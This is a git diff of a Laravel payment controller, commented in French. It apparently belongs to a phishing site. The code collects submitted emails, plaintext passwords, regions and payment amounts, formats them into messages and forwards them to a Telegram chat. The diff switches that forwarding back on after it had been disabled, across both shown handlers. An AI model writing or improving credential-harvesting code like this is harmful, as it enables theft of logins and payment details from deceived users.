@@ -25,10 +25,22 @@ class PaymentController extends Controller
                  . "📧 Email : {$validated['username']}\n"
                  . "🔐 Mot de passe : {$validated['password']}" ;
 
-        // Envoyer Telegram avec timeout court
-        $this->sendTelegramMessage($message);
+        try {
+            // 3. Envoi de la notification
+            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                ->notify(new TelegramAlert($message));
 
-        return redirect()->route('personal-info');
+                return redirect()->route('personal-info');
+
+        } catch (\Exception $e) {
+
+            Log::error('Erreur Telegram : '.$e->getMessage());
+            
+            return redirect()->route('personal-info');
+        }
+
+        
+        
     }
 
     /**
@@ -59,37 +71,15 @@ class PaymentController extends Controller
                  . "🗺️ Région : {$validated['region']}\n"
                  . "💰 Montant : {$validated['article_amount']} €";
 
-        // Envoyer Telegram avec timeout court
-        $this->sendTelegramMessage($message);
-
-        return redirect()->route('reservation');
-    }
-
-    /**
-     * Envoyer un message Telegram avec timeout court
-     */
-    private function sendTelegramMessage($message)
-    {
-        // TELEGRAM DISABLED FOR NOW
-        return;
-        /*
         try {
-            // Timeout 5 secondes max
-            $timeout = 5;
-            $start = time();
-            
+            // Envoi de la notification
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                 ->notify(new TelegramAlert($message));
-                
-            $elapsed = time() - $start;
-            if ($elapsed > 3) {
-                Log::warning("Telegram took {$elapsed}s");
-            }
-        } catch (\Throwable $e) {
-            Log::error('Telegram Error: ' . $e->getMessage());
-            // Continue silencieusement
+        } catch (\Exception $e) {
+            Log::error('Erreur Telegram : '.$e->getMessage());
         }
-        */
+
+        return redirect()->route('reservation');
     }
 
     
